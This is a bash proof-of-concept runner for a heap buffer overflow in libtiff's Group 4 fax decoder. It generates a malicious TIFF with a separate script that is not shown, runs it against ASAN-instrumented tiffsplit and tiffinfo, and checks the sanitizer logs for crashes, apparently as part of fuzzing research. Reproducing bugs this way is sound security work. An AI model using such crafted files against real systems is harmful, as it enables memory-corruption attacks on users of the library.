#!/bin/bash
# PoC runner for libtiff VULN 001: EXPAND2D heap buffer overflow
# Compression: CCITTFAX4 (Group 4 fax)
# Primary binary: tiffsplit (ASAN-instrumented build)
# Fallback binary: tiffinfo -d (also ASAN-instrumented; decodes strip data)

set -euo pipefail

POC_DIR="/data/ylwang/non-textfuzz/target/_poc/libtiff/libtiff_tif_fax3_c"
BUILD_DIR="/data/ylwang/non-textfuzz/target/libtiff/build_test/bin"
TIFFSPLIT="${BUILD_DIR}/tiffsplit"
TIFFINFO="${BUILD_DIR}/tiffinfo"
RESULT="${POC_DIR}/vuln_001_result.txt"

cd "${POC_DIR}"

# Generate the malicious TIFF if not already present
if [ ! -f vuln_001.tif ]; then
    echo "[*] Generating vuln_001.tif ..."
    python3 vuln_001_gen.py
fi

echo "[*] Malicious TIFF: $(ls -lh vuln_001.tif | awk '{print $5, $9}')"

# Clear previous results and ASAN logs
rm -f "${RESULT}" asan.log.*

# ─────────────────────────────────────────────────────────────────────────────
# PRIMARY: tiffsplit (required by task rules)
# NOTE: tiffsplit uses TIFFReadRawStrip() which bypasses the G4 decoder.
#       Fax4Decode() / EXPAND2D are therefore NOT invoked by tiffsplit.
#       The ASAN crash is NOT expected from this run.
# ─────────────────────────────────────────────────────────────────────────────
echo "[*] --- PRIMARY: tiffsplit ---" | tee -a "${RESULT}"
ASAN_OPTIONS="abort_on_error=0:log_path=${POC_DIR}/asan.log" \
  "${TIFFSPLIT}" vuln_001.tif /tmp/tiffsplit_out_ \
  >> "${RESULT}" 2>&1 || true

FOUND_ASAN=0
for f in "${POC_DIR}"/asan.log.*; do
    if [ -f "$f" ]; then
        echo "[*] Found ASAN log from tiffsplit: $f" | tee -a "${RESULT}"
        if grep -qE "heap-buffer-overflow|AddressSanitizer: .*WRITE|AddressSanitizer: .*READ|runtime error:" "$f"; then
            grep -E "AddressSanitizer|ERROR:|runtime error:|heap-buffer-overflow|SEGV" \
                 "$f" >> "${RESULT}" && FOUND_ASAN=1
        fi
    fi
done

if [ "${FOUND_ASAN}" -eq 0 ]; then
    echo "[!] tiffsplit: no ASAN crash (uses TIFFReadRawStrip, G4 decoder not called)" \
        | tee -a "${RESULT}"
fi

# ─────────────────────────────────────────────────────────────────────────────
# FALLBACK: tiffinfo -d (calls TIFFReadEncodedStrip → Fax4Decode → EXPAND2D)
# This DOES invoke the decoder and IS expected to crash with ASAN.
# ─────────────────────────────────────────────────────────────────────────────
echo "[*] --- FALLBACK: tiffinfo -d (calls TIFFReadEncodedStrip) ---" \
    | tee -a "${RESULT}"
rm -f "${POC_DIR}"/asan_tiffinfo.log.*
ASAN_OPTIONS="abort_on_error=0:log_path=${POC_DIR}/asan_tiffinfo.log" \
  "${TIFFINFO}" -d vuln_001.tif \
  >> "${RESULT}" 2>&1 || true

FOUND_TIFFINFO_ASAN=0
for f in "${POC_DIR}"/asan_tiffinfo.log.*; do
    if [ -f "$f" ]; then
        echo "[*] Found ASAN log from tiffinfo: $f" | tee -a "${RESULT}"
        if grep -qE "heap-buffer-overflow|AddressSanitizer: .*WRITE|AddressSanitizer: .*READ|runtime error:" "$f"; then
            grep -E "AddressSanitizer|ERROR:|runtime error:|heap-buffer-overflow|SEGV" \
                 "$f" >> "${RESULT}" && FOUND_TIFFINFO_ASAN=1
        fi
    fi
done

echo "---" >> "${RESULT}"
echo "tiffsplit ASAN: ${FOUND_ASAN}" >> "${RESULT}"
echo "tiffinfo  ASAN: ${FOUND_TIFFINFO_ASAN}" >> "${RESULT}"

echo "[*] Results saved to: ${RESULT}"
cat "${RESULT}"
